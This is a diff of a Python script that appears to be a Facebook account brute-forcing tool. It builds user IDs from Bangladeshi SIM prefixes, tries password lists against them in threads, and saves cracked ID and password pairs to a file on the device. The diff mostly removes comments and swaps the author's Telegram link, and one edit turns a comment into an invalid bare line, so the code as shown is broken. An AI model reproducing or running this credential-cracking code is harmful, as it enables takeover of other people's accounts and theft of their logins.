@@ -85,7 +85,6 @@ def main():
     else:
         main()
         
-#______________OLD DEF_______________#
 
 def fuckMyxmosabbirold(series):
     ____banner____()
@@ -112,7 +111,7 @@ def fuckMyxmosabbirold(series):
             Fuck_xnxx.submit(Fucking_life, ids, passlist)
     sys.exit("\n-------------------------------")
     
-#______________OLD METHOD_______________#   
+______________OLD METHOD_______________ 
 
 def Fucking_life(ids, passlist):
     global loop, oks, cps
@@ -130,7 +129,7 @@ def Fucking_life(ids, passlist):
                 oks.append(ids)
                 break
             elif "www.facebook.com" in response.get("error", {}).get("message", ""):
-                print(f"\r\r\x1bAROOT💎MOSABBIR💎OK | {ids} • {pas}")
+                print(f"\r\r\x1bA💎MOSABBIR💎OK | {ids} • {pas}")
                 open("/sdcard/mosabbirold-OK.txt", "a").write(ids + "|" + pas + "\n")
                 cps.append(ids)
                 break
@@ -138,14 +137,12 @@ def Fucking_life(ids, passlist):
     except Exception as e:
         pass
         
-#______________RANDDOM DEF_______________#
-#===========FUCK RANDOM==============#
 {"""
 def FUCK_XNXXX():
     user=[]
     clear()
     ____banner____()
-    os.system("xdg-open https://t.me/asif_tricker95")
+    os.system("xdg-open https://t.me/mosabbirhossainsajib")
     print(' EXAMPLE SIM CODE : [016] [017] [018] [019]')
     code=input(' ENTER SIM CODE >> ')
     
@@ -179,7 +176,6 @@ def FUCK_XNXXX():
     input(' PRESS ENTER TO BACK  : ')
     BROKEN_ASIF()
     
-#______________RANDDOM METHOD_______________#
 
 def FUCK_FRIEND(ids,passlist):
     global oks
